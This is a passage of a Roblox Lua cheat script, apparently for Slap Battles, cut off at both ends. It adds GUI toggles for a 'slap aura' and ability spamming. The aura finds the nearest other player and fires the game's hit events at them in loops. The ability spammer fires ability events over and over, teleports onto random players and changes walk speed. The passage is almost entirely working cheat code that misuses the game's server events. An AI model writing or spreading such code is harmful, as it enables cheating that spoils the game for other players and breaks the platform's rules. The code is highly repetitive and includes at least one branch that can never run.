                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "OVERKILL" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("Overkillhit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Plague" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("PlagueHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Phase" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("PhaseH"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                         elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Dominance" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("DominanceHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                         elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "potato" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("potatohit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                         elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Hallow Jack" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("HallowHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                         elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "CUSTOM" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("CustomHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                         elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "CULT" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("CULTHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                         elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "bob" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("bobhit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                         elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Buddies" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("buddiesHIT"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                         elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Orbit" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("Orbihit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                         elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Slapple" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("SlappleHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                         elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Disarm" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("DisarmH"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                         elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Link" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("LinkHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                         elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Rhythm" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("rhythmhit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                         elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Rojo" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("RojoHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                         elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Hitman" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("HitmanHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                         elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Retro" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("RetroHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                            elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Null" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("NullHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Plank" or game.Players.LocalPlayer.leaderstats.Glove.Value == "bus" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Hybrid" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Rage" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Frostbite" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Spoonful" or game.Players.LocalPlayer.leaderstats.Glove.Value == "MEGAROCK" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Obby" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Goofy" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Firework" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Elude" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Run" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Santa" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Recall" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Beserk" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Kinetic" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Knockoff" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Joust" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Lure" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Voodoo" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Divebomb" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Lamp" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Moon" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Jupiter" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Necromancer" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Blasphemy" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Pan" or game.Players.LocalPlayer.leaderstats.Glove.Value == "rob" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Hammer" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Quake" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Trap" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Titan" or game.Players.LocalPlayer.leaderstats.Glove.Value == "Glovel" then
                        while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                        end
                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "bob" then 
                    while _G.SlapAura do
   
   local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local function getNearestPlayer()
    local closestPlayer = nil
    local closestDistance = math.huge
    local localPlayer = Players.LocalPlayer
    local localCharacter = localPlayer.Character
    local localTorso = localCharacter and localCharacter:FindFirstChild("Torso")

    if not localTorso then return nil end

    for _, player in pairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            local character = player.Character
            local torso = character and character:FindFirstChild("Torso")
            if torso then
                local distance = (localTorso.Position - torso.Position).magnitude
                if distance < closestDistance then
                    closestDistance = distance
                    closestPlayer = player
                end
            end
        end
    end

    return closestPlayer
end

local nearestPlayer = getNearestPlayer()

if nearestPlayer then
    local nearestTorso = nearestPlayer.Character.Torso
    local args = {
        [1] = nearestTorso
    }

    ReplicatedStorage:WaitForChild("bobhit"):FireServer(unpack(args))
else
    warn("No nearest player found")
end
   
   wait(1)
                    end
                    
        end
else 
  OrionLib:MakeNotification({
    Name = "Ops",
    Content = "You need to be in the Arena.",
    Image = "rbxassetid://17748409757",
    Time = 5
})
wait(0.2)
SlapAuraTog:Set(false)
   end
  end
end
})


TabMain:AddToggle({
	Name = "Spam Glove Ability",
	Default = false,
	Callback = function(Value)
		_G.SpamAb = Value
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Fort" do
game:GetService("ReplicatedStorage").Fortlol:FireServer()
wait(3.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Home Run" do
game:GetService("ReplicatedStorage").HomeRun:FireServer({["start"] = true})
game:GetService("ReplicatedStorage").HomeRun:FireServer({["finished"] = true})
task.wait(4.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "🗿" do
game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer(CFrame.new(math.random(-70, 63), -5.72293854, math.random(-90, 93), 0.151493087, -8.89114702e-08, 0.988458335, 1.45089563e-09, 1, 8.97272727e-08, -0.988458335, -1.21589121e-08, 0.151493087))
wait(3.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Shukuchi" do
local players = game.Players:GetChildren()
local RandomPlayer = players[math.random(1, #players)]
repeat RandomPlayer = players[math.random(1, #players)] until RandomPlayer ~= game.Players.LocalPlayer and RandomPlayer.Character:FindFirstChild("rock") == nil and RandomPlayer.Character.Head:FindFirstChild("UnoReverseCard") == nil
Target = RandomPlayer
if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and game.Players.LocalPlayer.Character.Head:FindFirstChild("RedEye") == nil then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame
end
wait(0.09)
game:GetService("ReplicatedStorage").SM:FireServer(Target)
wait(0.8)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Slicer" do
game:GetService("ReplicatedStorage").Slicer:FireServer("sword")
game:GetService("ReplicatedStorage").Slicer:FireServer("slash", game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame, Vector3.new())
wait(5.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Reverse" do
game:GetService("ReplicatedStorage"):WaitForChild("ReverseAbility"):FireServer()
task.wait(5.7)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "rob" do
game:GetService("ReplicatedStorage").rob:FireServer()
wait(3)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "bob" do
game:GetService("ReplicatedStorage").bob:FireServer()
wait(9)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Kraken" do
game:GetService("ReplicatedStorage").KrakenArm:FireServer()
wait(5)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Sbeve" do
game:GetService("ReplicatedStorage").KrakenArm:FireServer()
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Psycho" do
game:GetService("ReplicatedStorage").Psychokinesis:InvokeServer({["grabEnabled"] = true})
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Killstreak" do
game:GetService("ReplicatedStorage").KSABILI:FireServer()
wait(6.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "bus" do
game:GetService("ReplicatedStorage").busmoment:FireServer()
wait(5.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Mitten" do
game:GetService("ReplicatedStorage").MittenA:FireServer()
wait(5.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Defense" do
game:GetService("ReplicatedStorage").Barrier:FireServer()
wait(0.25)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Bomb" do
game:GetService("ReplicatedStorage").BombThrow:FireServer()
wait(2.5)
game:GetService("ReplicatedStorage").BombThrow:FireServer()
wait(4.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Replica" do
game:GetService("ReplicatedStorage").Duplicate:FireServer(true)
wait(5.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Pusher" do
game:GetService("ReplicatedStorage").PusherWall:FireServer()
wait(5.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Jet" do
local players = game.Players:GetChildren()
local RandomPlayer = players[math.random(1, #players)]
repeat RandomPlayer = players[math.random(1, #players)] until RandomPlayer ~= game.Players.LocalPlayer and RandomPlayer.Character:FindFirstChild("entered") and RandomPlayer.Character:FindFirstChild("rock") == nil
Target = RandomPlayer
game:GetService("ReplicatedStorage").AirStrike:FireServer(Target.Character)
wait(5.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Tableflip" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
wait(3.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Shield" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
wait(3.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Rocky" do
game:GetService("ReplicatedStorage").RockyShoot:FireServer()
task.wait(7.5)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "God's Hand" do
game:GetService("ReplicatedStorage").TimestopJump:FireServer()
game:GetService("ReplicatedStorage").Timestopchoir:FireServer()
game:GetService("ReplicatedStorage").Timestop:FireServer()
wait(50.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Za Hando" do
game:GetService("ReplicatedStorage").Erase:FireServer()
wait(5.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Baller" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
wait(4.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Glitch" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
wait(5.34)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Stun" do
game:GetService("ReplicatedStorage").StunR:FireServer(game:GetService("Players").LocalPlayer.Character.Stun)
wait(10.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "STOP" do
game:GetService("ReplicatedStorage").STOP:FireServer(true)
wait(4.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Quake" do
game:GetService("ReplicatedStorage"):WaitForChild("QuakeQuake"):FireServer({["start"] = true})
game:GetService("ReplicatedStorage"):WaitForChild("QuakeQuake"):FireServer({["finished"] = true})
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Track" do
local players = game.Players:GetChildren()
local RandomPlayer = players[math.random(1, #players)]
repeat RandomPlayer = players[math.random(1, #players)] until RandomPlayer ~= game.Players.LocalPlayer and RandomPlayer.Character:FindFirstChild("entered") and RandomPlayer.Character:FindFirstChild("rock") == nil
Target = RandomPlayer
game:GetService("ReplicatedStorage").GeneralAbility:FireServer(Target.Character)
wait(10.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Mail" do
game:GetService("ReplicatedStorage").MailSend:FireServer()
wait(3.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Shard" do
game:GetService("ReplicatedStorage").Shards:FireServer()
wait(4.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "fish" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
wait(3.05)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Null" do
game:GetService("ReplicatedStorage").NullAbility:FireServer()
wait(0.01)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Counter" do
game:GetService("ReplicatedStorage").Counter:FireServer()
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 20
task.wait(6.2)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Voodoo" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
task.wait(6.27)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Swapper" do
game:GetService("ReplicatedStorage").SLOC:FireServer()
wait(5.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Gravity" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
